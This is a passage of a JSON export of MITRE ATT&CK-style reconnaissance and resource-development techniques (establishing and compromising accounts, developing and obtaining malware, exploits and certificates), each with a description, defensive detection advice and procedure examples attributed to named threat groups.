    "Description": "Adversaries may compromise third-party network devices that can be used during targeting. Network devices, such as small office/home office (SOHO) routers, may be compromised where the adversary's ultimate goal is notInitial Accessto that environment -- instead leveraging these devices to support additional targeting.Once an adversary has control, compromised network devices can be used to launch additional operations, such as hosting payloads forPhishingcampaigns (i.e.,Link Target) or enabling the required access to executeContent Injectionoperations. Adversaries may also be able to harvest reusable credentials (i.e.,Valid Accounts) from compromised network devices.Adversaries often target Internet-facing edge devices and related network appliances that specifically do not support robust host-based defenses.[1][2]Compromised network devices may be used to support subsequentCommand and Controlactivity, such asHide Infrastructurethrough an establishedProxyand/orBotnetnetwork.[3]",
    "Detects": [
      "Once adversaries leverage compromised network devices as infrastructure (ex: for command and control), it may be possible to look for unique characteristics associated with adversary software, if known.[14]Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle."
    ],
    "Procedure Examples": [
      "APT28compromised Ubiquiti network devices to act as collection devices for credentials compromised via phishing webpages.[4]",
      "DuringCutting Edge, threat actors used compromised and out-of-support Cyberoam VPN appliances for C2.[5][6]",
      "FLORAHOX Activityhas compromised network routers and IoT devices for the ORB network.[7]",
      "KV Botnet Activityfocuses on compromise of small office-home office (SOHO) network devices to build the subsequent botnet.[8]",
      "Leviathanhas used compromised networking devices, such as small office/home office (SOHO) devices, as operational command and control infrastructure.[9]",
      "Versa Director Zero Day Exploitationused compromised small office/home office (SOHO) devices to interact with vulnerable Versa Director servers.[10]",
      "Volt Typhoonhas compromised small office and home office (SOHO) network edge devices, many of which were located in the same geographic area as the victim, to proxy network traffic.[11][12]",
      "ZIRCONIUMhas compromised network devices such as small office and home office (SOHO) routers and IoT devices for ORB (operational relay box)Proxynetworks.[13][7]"
    ]
  },
  "T1585": {
    "Name": "Establish Accounts",
    "Description": "Adversaries may create and cultivate accounts with services that can be used during targeting. Adversaries can create accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations. This development could be applied to social media, website, or other publicly available information that could be referenced and scrutinized for legitimacy over the course of an operation using that persona or identity.[1][2]For operations incorporating social engineering, the utilization of an online persona may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, GitHub, Docker Hub, etc.). Establishing a persona may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos.[1][2]Establishing accounts can also include the creation of accounts with email providers, which may be directly leveraged forPhishing for InformationorPhishing.[3]In addition, establishing accounts may allow adversaries to abuse free services, such as registering for trial periods toAcquire Infrastructurefor malicious purposes.[4]",
    "Detects": [
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Consider monitoring social media activity related to your organization. Suspicious activity may include personas claiming to work for your organization or recently created/modified accounts making numerous connection requests to accounts affiliated with your organization.Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex:Phishing)."
    ],
    "Procedure Examples": [
      "APT17has created and cultivated profile pages in Microsoft TechNet. To make profile pages appear more legitimate,APT17has created biographical sections and posted in forum threads.[5]",
      "Ember Bearhas created accounts on dark web forums to obtain various tools and malware.[6]",
      "Fox Kittenhas created KeyBase accounts to communicate with ransomware victims.[7][8]",
      "Kimsukyhas leveraged stolen PII to create accounts.[9]"
    ]
  },
  "T1585.001": {
    "Name": "Establish Accounts:Social Media Accounts",
    "Description": "Adversaries may create and cultivate social media accounts that can be used during targeting. Adversaries can create social media accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations.[1][2]For operations incorporating social engineering, the utilization of a persona on social media may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single social media site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Establishing a persona  on social media may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos.Once a persona has been developed an adversary can use it to create connections to targets of interest. These connections may be direct or may include trying to connect through others.[1][2]These accounts may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex:Spearphishing via Service).",
    "Detects": [
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Consider monitoring social media activity related to your organization. Suspicious activity may include personas claiming to work for your organization or recently created/modified accounts making numerous connection requests to accounts affiliated with your organization.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex:Spearphishing via Service)."
    ],
    "Procedure Examples": [
      "APT32has set up Facebook pages in tandem with fake websites.[3]",
      "Cleaverhas created fake LinkedIn profiles that included profile photos, details, and connections.[4]",
      "CURIUMhas established a network of fictitious social media accounts, including on Facebook and LinkedIn, to establish relationships with victims, often posing as an attractive woman.[5]",
      "EXOTIC LILYhas established social media profiles to mimic employees of targeted companies.[6]",
      "Fox Kittenhas used a Twitter account to communicate with ransomware victims.[7]",
      "HEXANEhas established fraudulent LinkedIn accounts impersonating HR department employees to target potential victims with fake job offers.[8]",
      "Kimsukyhas created social media accounts to monitor news and security trends as well as potential targets.[9]",
      "Lazarus Grouphas created new Twitter accounts to conduct social engineering against potential victims.[10]",
      "Leviathanhas created new social media accounts for targeting efforts.[11]",
      "Magic Houndhas created fake LinkedIn and other social media accounts to contact targets and convince them--through messages and voice communications--to open malicious links.[12]",
      "Moonstone Sleethas created social media accounts to interact with victims.[13]",
      "ForOperation Dream Job,Lazarus Groupcreated fake LinkedIn accounts for their targeting efforts.[14][15]",
      "ForOperation Ghost,APT29registered Twitter accounts to host C2 nodes.[16]",
      "Sandworm Teamhas established social media accounts to disseminate victim internal-only documents and other sensitive data.[17]",
      "Star Blizzardhas established fraudulent profiles on professional networking sites to conduct reconnaissance.[18][19]"
    ]
  },
  "T1585.002": {
    "Name": "Establish Accounts:Email Accounts",
    "Description": "Adversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conductPhishing for InformationorPhishing.[1]Establishing email accounts may also allow adversaries to abuse free services – such as trial periods – toAcquire Infrastructurefor follow-on purposes.[2]Adversaries may also take steps to cultivate a persona around the email account, such as through use ofSocial Media Accounts, to increase the chance of success of follow-on behaviors. Created email accounts can also be used in the acquisition of infrastructure (ex:Domains).[1]To decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services.[3]",
    "Detects": [],
    "Procedure Examples": [
      "APT1has created email accounts for later use in social engineering, phishing, and when registering domains.[1]",
      "APT42has created email accounts to use in spearphishing operations.[4]",
      "CURIUMhas created dedicated email accounts for use with tools such asIMAPLoader.[5]",
      "EXOTIC LILYhas created e-mail accounts to spoof targeted organizations.[6]",
      "ForFunnyDream, the threat actors likely established an identified email account to register a variety of domains that were used during the campaign.[7]",
      "HEXANEhas established email accounts for use in domain registration including for ProtonMail addresses.[8]",
      "Indrik Spiderhas created email accounts to communicate with their ransomware victims, to include providing payment and decryption details.[9]",
      "Kimsukyhas created email accounts for phishing operations.[10][11][12]",
      "Lazarus Grouphas created new email accounts for spearphishing operations.[13]",
      "Leviathanhas created new email accounts for targeting efforts.[14]",
      "Magic Houndhas established email accounts using fake personas for spearphishing operations.[15][16]",
      "Moonstone Sleethas created email accounts to interact with victims, including for phishing purposes.[17]",
      "Mustang Pandahas leveraged the legitimate email marketing service SMTP2Go for phishing campaigns.[18]",
      "DuringOperation Dream Job,Lazarus Groupcreated fake email accounts to correspond with fake LinkedIn personas;Lazarus Groupalso established email accounts to match those of the victim as part of their BEC attempt.[19]",
      "ForOperation Dust Storm, the threat actors established email addresses to register domains for their operations.[20]",
      "DuringOperation Honeybee, attackers created email addresses to register for a free account for a control server used for the implants.[21]",
      "ForOperation Wocao, the threat actors registered email accounts to use during the campaign.[22]",
      "Sandworm Teamhas created email accounts that mimic legitimate organizations for its spearphishing operations.[23]",
      "Silent Librarianhas established e-mail accounts to receive e-mails forwarded from compromised accounts.[24]",
      "Star Blizzardhas registered impersonation email accounts to spoof experts in a particular field or individuals and organizations affiliated with the intended target.[25][26][27]",
      "Wizard Spiderhas leveraged ProtonMail email addresses in ransom notes when deliveringRyukransomware.[28]"
    ]
  },
  "T1585.003": {
    "Name": "Establish Accounts:Cloud Accounts",
    "Description": "Adversaries may create accounts with cloud providers that can be used during targeting. Adversaries can use cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, MEGA, Microsoft OneDrive, or AWS S3 buckets forExfiltration to Cloud Storageor toUpload Tools. Cloud accounts can also be used in the acquisition of infrastructure, such asVirtual Private Servers orServerlessinfrastructure. Establishing cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.[1]CreatingCloud Accountsmay also require adversaries to establishEmail Accountsto register with the cloud provider.",
    "Detects": [],
    "Procedure Examples": [
      "DuringOuter Space,OilRigcreated M365 email accounts to be used as part of C2.[2]",
      "Storm-1811has created malicious accounts to enable activity via Microsoft Teams, typically spoofing various IT support and helpdesk themes.[3]"
    ]
  },
  "T1586": {
    "Name": "Compromise Accounts",
    "Description": "Adversaries may compromise accounts with services that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating accounts (i.e.Establish Accounts), adversaries may compromise existing accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona.A variety of methods exist for compromising accounts, such as gathering credentials viaPhishing for Information, purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials.[1][2]Prior to compromising accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.Personas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, etc.). Compromised accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.Adversaries may directly leverage compromised email accounts forPhishing for InformationorPhishing.",
    "Detects": [
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Consider monitoring social media activity related to your organization. Suspicious activity may include personas claiming to work for your organization or recently modified accounts making numerous connection requests to accounts affiliated with your organization.Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex:Phishing)."
    ],
    "Procedure Examples": [
      "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."
    ]
  },
  "T1586.001": {
    "Name": "Compromise Accounts:Social Media Accounts",
    "Description": "Adversaries may compromise social media accounts that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating social media profiles (i.e.Social Media Accounts), adversaries may compromise existing social media accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona.A variety of methods exist for compromising social media accounts, such as gathering credentials viaPhishing for Information, purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps).[1]Prior to compromising social media accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.Personas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Compromised social media accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.Adversaries can use a compromised social media profile to create new, or hijack existing, connections to targets of interest. These connections may be direct or may include trying to connect through others.[2][3]Compromised profiles may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex:Spearphishing via Service).",
    "Detects": [
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s), leveraging SSL/TLS inspection for encrypted traffic, that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Consider monitoring social media activity related to your organization. Suspicious activity may include personas claiming to work for your organization or recently modified accounts making numerous connection requests to accounts affiliated with your organization.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex:Spearphishing via Service)."
    ],
    "Procedure Examples": [
      "Leviathanhas compromised social media accounts to conduct social engineering attacks.[4]",
      "Sandworm Teamcreates credential capture webpages to compromise existing, legitimate social media accounts.[5]"
    ]
  },
  "T1586.002": {
    "Name": "Compromise Accounts:Email Accounts",
    "Description": "Adversaries may compromise email accounts that can be used during targeting. Adversaries can use compromised email accounts to further their operations, such as leveraging them to conductPhishing for Information,Phishing, or large-scale spam email campaigns. Utilizing an existing persona with a compromised email account may engender a level of trust in a potential victim if they have a relationship with, or knowledge of, the compromised persona. Compromised email accounts can also be used in the acquisition of infrastructure (ex:Domains).A variety of methods exist for compromising email accounts, such as gathering credentials viaPhishing for Information, purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials.[1][2]Prior to compromising email accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. Adversaries may target compromising well-known email accounts or domains from which malicious spam orPhishingemails may evade reputation-based email filtering rules.Adversaries can use a compromised email account to hijack existing email threads with targets of interest.",
    "Detects": [],
    "Procedure Examples": [
      "APT28has used compromised email accounts to send credential phishing emails.[3]",
      "APT29has compromised email accounts to further enable phishing campaigns and taken control of dormant accounts.[4][5]",
      "HEXANEhas used compromised accounts to send spearphishing emails.[6]",
      "IndigoZebrahas compromised legitimate email accounts to use in their spearphishing operations.[7]",
      "Kimsukyhas compromised email accounts to send spearphishing e-mails.[8][9]",
      "LAPSUS$has payed employees, suppliers, and business partners of target organizations for credentials.[10][11]",
      "Leviathanhas compromised email accounts to conduct social engineering attacks.[12]",
      "Magic Houndhas compromised personal email accounts through the use of legitimate credentials and gathered additional victim information.[13]",
      "OilRighas compromised email accounts to send phishing emails.[14]",
      "Star Blizzardhas used compromised email accounts to conduct spearphishing against contacts of the original victim.[15]",
      "TA577has sent thread hijacked messages from compromised emails.[16]"
    ]
  },
  "T1586.003": {
    "Name": "Compromise Accounts:Cloud Accounts",
    "Description": "Adversaries may compromise cloud accounts that can be used during targeting. Adversaries can use compromised cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, Microsoft OneDrive, or AWS S3 buckets forExfiltration to Cloud Storageor toUpload Tools. Cloud accounts can also be used in the acquisition of infrastructure, such asVirtual Private Servers orServerlessinfrastructure. Additionally, cloud-based messaging services such as Twilio, SendGrid, AWS End User Messaging, AWS SNS (Simple Notification Service), or AWS SES (Simple Email Service) may be leveraged for spam orPhishing.[1][2]Compromising cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.[3]A variety of methods exist for compromising cloud accounts, such as gathering credentials viaPhishing for Information, purchasing credentials from third-party sites, conductingPassword Sprayingattacks, or attempting toSteal Application Access Tokens.[4]Prior to compromising cloud accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. In some cases, adversaries may target privileged service provider accounts with the intent of leveraging aTrusted Relationshipbetween service providers and their customers.[4]",
    "Detects": [],
    "Procedure Examples": [
      "APT29has used residential proxies, including Azure Virtual Machines, to obfuscate their access to victim environments.[5]",
      "APT41 DUSTused compromised Google Workspace accounts for command and control.[6]"
    ]
  },
  "T1587": {
    "Name": "Develop Capabilities",
    "Description": "Adversaries may build capabilities that can be used during targeting. Rather than purchasing, freely downloading, or stealing capabilities, adversaries may develop their own capabilities in-house. This is the process of identifying development requirements and building solutions such as malware, exploits, and self-signed certificates. Adversaries may develop capabilities to support their operations throughout numerous phases of the adversary lifecycle.[1][2][3][4]As with legitimate development efforts, different skill sets may be required for developing capabilities. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the capability.",
    "Detects": [
      "Consider use of services that may aid in the tracking of capabilities, such as certificates, in use on sites across the Internet. In some cases it may be possible to pivot on known pieces of information to uncover other adversary infrastructure.[7]Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Defense Evasion or Command and Control.",
      "Consider analyzing malware for features that may be associated with the adversary and/or their developers, such as compiler used, debugging artifacts, or code similarities. Malware repositories can also be used to identify additional samples associated with the adversary and identify development patterns over time. Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Defense Evasion or Command and Control.",
      "Monitor for contextual data about a malicious payload, such as compilation times, file hashes, as well as watermarks or other identifiable configuration information. Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Defense Evasion or Command and Control."
    ],
    "Procedure Examples": [
      "Kimsukycreated and used a mailing toolkit to use in spearphishing attacks.[5]",
      "Moonstone Sleetdeveloped malicious npm packages for delivery to or retrieval by victims.[6]"
    ]
  },
  "T1587.001": {
    "Name": "Develop Capabilities:Malware",
    "Description": "Adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.[1][2][3][4]As with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware.Some aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use ofWeb Services.[5]",
    "Detects": [
      "Consider analyzing malware for features that may be associated with the adversary and/or their developers, such as compiler used, debugging artifacts, or code similarities. Malware repositories can also be used to identify additional samples associated with the adversary and identify development patterns over time.",
      "Monitor for contextual data about a malicious payload, such as compilation times, file hashes, as well as watermarks or other identifiable configuration information. Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle."
    ],
    "Procedure Examples": [
      "Aoqin Dragonhas used custom malware, includingMongallandHeyoka Backdoor, in their operations.[6]",
      "APT29has used unique malware in many of their operations.[7][8][9][10]",
      "ArcaneDoorfeatured the development and deployment of two unique malware types,Line DancerandLine Runner.[11][12]",
      "ForC0010, UNC3890 actors used unique malware, includingSUGARUSHandSUGARDUMP.[13]",
      "Cleaverhas created customized tools and payloads for functions including ARP poisoning, encryption, credential dumping, ASP.NET shells, web backdoors, process enumeration, WMI querying, HTTP and SMB communications, network interface sniffing, and keystroke logging.[14]",
      "ForCostaRicto, the threat actors used custom malware, includingPS1,CostaBricks, andSombRAT.[15]",
      "FIN13has utilized custom malware to maintain persistence in a compromised environment.[16][17]",
      "FIN7has developed malware for use in operations, including the creation of infected removable media.[4][18]",
      "Indrik Spiderhas developed malware for their operations, including ransomware such asBitPaymerandWastedLocker.[19]",
      "ForJuicy Mix,OilRigimproved onSolarby developing theMangobackdoor.[20]",
      "Ke3changhas developed custom malware that allowed them to maintain persistence on victim networks.[21]",
      "Kimsukyhas developed its own unique malware such as MailFetch.py for use in operations.[22][23][24]",
      "Lazarus Grouphas developed custom malware for use in their operations.[25][26]",
      "LuminousMothhas used unique malware for information theft and exfiltration.[27][28]",
      "Moonstone Sleethas developed custom malware, including a malware delivery mechanism masquerading as a legitimate game.[29]",
      "Moses Staffhas built malware, such asDCSrvandPyDCrypt, for targeting victims' machines.[30]",
      "OilRigactively developed and used a series of downloaders during 2022.[31]",
      "ForOperation Dream Job,Lazarus Groupdeveloped custom tools such as Sumarta, DBLL Dropper,Torisma, andDRATzarusfor their operations.[32][33][34][35]",
      "ForOperation Ghost,APT29used new strains of malware includingFatDuke,MiniDuke,RegDuke, andPolyglotDuke.[36]",
      "ForOperation Sharpshooter, the threat actors used theRising Sunmodular backdoor.[37]",
      "DuringOperation Wocao, threat actors developed their own custom webshells to upload to compromised servers.[38]",
      "ForOuter Space,OilRigcreated new implants including theSolarbackdoor.[20]",
      "Playdeveloped and employPlaycryptransomware.[39][40]",
      "RedCurlhas created its own tools to use during operations.[41]",
      "Salt Typhoonhas used custom tooling includingJumbledPath.[42]",
      "Sandworm Teamhas developed malware for its operations, including malicious mobile applications and destructive malware such asNotPetyaandOlympic Destroyer.[43]",
      "For theSolarWinds Compromise,APT29used numerous pieces of malware that were likely developed for or by the group, includingSUNBURST,SUNSPOT,Raindrop, andTEARDROP.[44][45][46]",
      "TeamTNThas developed custom malware such asHildegard.[47]",
      "In theTriton Safety Instrumented System Attack,TEMP.Velesdeveloped, prior to the attack, malware capabilities that would require access to specific and specialized hardware and software.[48]",
      "Turlahas developed its own unique malware for use in operations.[49]",
      "Versa Director Zero Day Exploitationinvolved the development of a new web shell variant,VersaMem.[50]"
    ]
  },
  "T1587.002": {
    "Name": "Develop Capabilities:Code Signing Certificates",
    "Description": "Adversaries may create self-signed code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.[1]Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.Prior toCode Signing, adversaries may develop self-signed code signing certificates for use in operations.",
    "Detects": [
      "Consider analyzing self-signed code signing certificates for features that may be associated with the adversary and/or their developers, such as the thumbprint, algorithm used, validity period, and common name. Malware repositories can also be used to identify additional samples associated with the adversary and identify patterns an adversary has used in crafting self-signed code signing certificates.Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related follow-on behavior, such asCode SigningorInstall Root Certificate."
    ],
    "Procedure Examples": [
      "Daggerflycreated code signing certificates to sign malicious macOS files.[2]",
      "DuringOperation Dream Job,Lazarus Groupdigitally signed their malware and the dbxcli utility.[3]",
      "Patchworkhas created self-signed certificates from fictitious and spoofed legitimate software companies that were later used to sign malware.[4]",
      "PROMETHIUMhas created self-signed certificates to sign malicious installers.[5]"
    ]
  },
  "T1587.003": {
    "Name": "Develop Capabilities:Digital Certificates",
    "Description": "Adversaries may create self-signed SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. In the case of self-signing, digital certificates will lack the element of trust associated with the signature of a third-party certificate authority (CA).Adversaries may create self-signed SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex:Asymmetric CryptographywithWeb Protocols) or even enablingAdversary-in-the-Middleif added to the root of trust (i.e.Install Root Certificate).After creating a digital certificate, an adversary may then install that certificate (seeInstall Digital Certificate) on infrastructure under their control.",
    "Detects": [
      "Consider use of services that may aid in the tracking of certificates in use on sites across the Internet. In some cases it may be possible to pivot on known pieces of certificate information to uncover other adversary infrastructure.[7]Detection efforts may be focused on related behaviors, such asWeb Protocols,Asymmetric Cryptography, and/orInstall Root Certificate."
    ],
    "Procedure Examples": [
      "APT29has created self-signed digital certificates to enable mutual TLS authentication for malware.[1][2]",
      "ArcaneDoorincluded acquiring digital certificates mimicking patterns associated with Cisco ASA appliances for command and control infrastructure.[3]",
      "ForC0011,Transparent Tribeestablished SSL certificates on the typo-squatted domains the group registered.[4]",
      "During theJ-magic Campaign, threat actors used self-signed certificates on VPS C2 infrastructure.[5]",
      "PROMETHIUMhas created self-signed digital certificates for use in HTTPS C2 traffic.[6]"
    ]
  },
  "T1587.004": {
    "Name": "Develop Capabilities:Exploits",
    "Description": "Adversaries may develop exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than finding/modifying exploits from online or purchasing them from exploit vendors, an adversary may develop their own exploits.[1]Adversaries may use information acquired viaVulnerabilitiesto focus exploit development efforts. As part of the exploit development process, adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis.[2]As with legitimate development efforts, different skill sets may be required for developing exploits. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's exploit development capabilities, provided the adversary plays a role in shaping requirements and maintains an initial degree of exclusivity to the exploit.Adversaries may use exploits during various phases of the adversary lifecycle (i.e.Exploit Public-Facing Application,Exploitation for Client Execution,Exploitation for Privilege Escalation,Exploitation for Defense Evasion,Exploitation for Credential Access,Exploitation of Remote Services, andApplication or System Exploitation).",
    "Detects": [],
    "Procedure Examples": [
      "Leviathanhas rapidly transformed and adapted public exploit proof-of-concept code for new vulnerabilities and utilized them against target networks.[3]",
      "Volt Typhoonhas exploited zero-day vulnerabilities for initial access.[4]"
    ]
  },
  "T1588": {
    "Name": "Obtain Capabilities",
    "Description": "Adversaries may buy and/or steal capabilities that can be used during targeting. Rather than developing their own capabilities in-house, adversaries may purchase, freely download, or steal them. Activities may include the acquisition of malware, software (including licenses), exploits, certificates, and information relating to vulnerabilities. Adversaries may obtain capabilities to support their operations throughout numerous phases of the adversary lifecycle.In addition to downloading free malware, software, and exploits from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware and exploits, criminal marketplaces, or from individuals.[1][2]In addition to purchasing capabilities, adversaries may steal capabilities from third-party entities (including other adversaries). This can include stealing software licenses, malware, SSL/TLS and code-signing certificates, or raiding closed databases of vulnerabilities or exploits.[3]",
    "Detects": [
      "Consider use of services that may aid in the tracking of newly issued certificates and/or certificates in use on sites across the Internet. In some cases it may be possible to pivot on known pieces of certificate information to uncover other adversary infrastructure.[4]Some server-side components of adversary tools may have default values set for SSL/TLS certificates.[5]Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Defense Evasion or Command and Control.",
      "Monitor for logged network traffic in response to a scan showing both protocol header and body values that may buy and/or steal capabilities that can be used during targeting. Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Defense Evasion or Command and Control.",
      "Consider analyzing malware for features that may be associated with malware providers, such as compiler used, debugging artifacts, code similarities, or even group identifiers associated with specific Malware-as-a-Service (MaaS) offerings. Malware repositories can also be used to identify additional samples associated with the developers and the adversary utilizing their services. Identifying overlaps in malware use by different adversaries may indicate malware was obtained by the adversary rather than developed by them. In some cases, identifying overlapping characteristics in malware used by different adversaries may point to a shared quartermaster.[6]Malware repositories can also be used to identify features of tool use associated with an adversary, such as watermarks inCobalt Strikepayloads.[7]",
      "Monitor for contextual data about a malicious payload, such as compilation times, file hashes, as well as watermarks or other identifiable configuration information. Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Defense Evasion or Command and Control."
    ],
    "Procedure Examples": [
      "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."
    ]
  },
  "T1588.001": {
    "Name": "Obtain Capabilities:Malware",
    "Description": "Adversaries may buy, steal, or download malware that can be used during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.In addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware development, criminal marketplaces (including Malware-as-a-Service, or MaaS), or from individuals. In addition to purchasing malware, adversaries may steal and repurpose malware from third-party entities (including other adversaries).",
    "Detects": [
      "Consider analyzing malware for features that may be associated with malware providers, such as compiler used, debugging artifacts, code similarities, or even group identifiers associated with specific MaaS offerings. Malware repositories can also be used to identify additional samples associated with the developers and the adversary utilizing their services. Identifying overlaps in malware use by different adversaries may indicate malware was obtained by the adversary rather than developed by them. In some cases, identifying overlapping characteristics in malware used by different adversaries may point to a shared quartermaster.[21]",
      "Monitor for contextual data about a malicious payload, such as compilation times, file hashes, as well as watermarks or other identifiable configuration information. Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle."
    ],
    "Procedure Examples": [
      "Andarielhas used a variety of publicly-available remote access Trojans (RATs) for its operations.[1]",
      "APT1used publicly available malware for privilege escalation.[2]",
      "Aquatic Pandahas acquired and usednjRATin its operations.[3]",
      "BackdoorDiplomacyhas obtained and used leaked malware, including DoublePulsar, EternalBlue, EternalRocks, and EternalSynergy, in its operations.[4]",
      "ForC0015, the threat actors usedCobalt StrikeandContiransomware.[5]",
      "Earth Luscahas acquired and used a variety of malware, includingCobalt Strike.[6]",
      "Ember Bearhas acquired malware and related tools from dark web forums.[7]",
      "ForFunnyDream, the threat actors used a new backdoor namedFunnyDream.[8]",
      "During theJ-magic Campaigncampaign, threat actors used open-source malware post-compromise including a custom variant of the cd00r backdoor.[9]",
      "LAPSUS$acquired and used the Redline password stealer in their operations.[10]",
      "LazyScripterhas used a variety of open-source remote access Trojans for its operations.[11]",
      "LuminousMothhas obtained and used malware such asCobalt Strike.[12][13]",
      "Metadorhas used unique malware in their operations, includingmetaMainandMafalda.[14]",
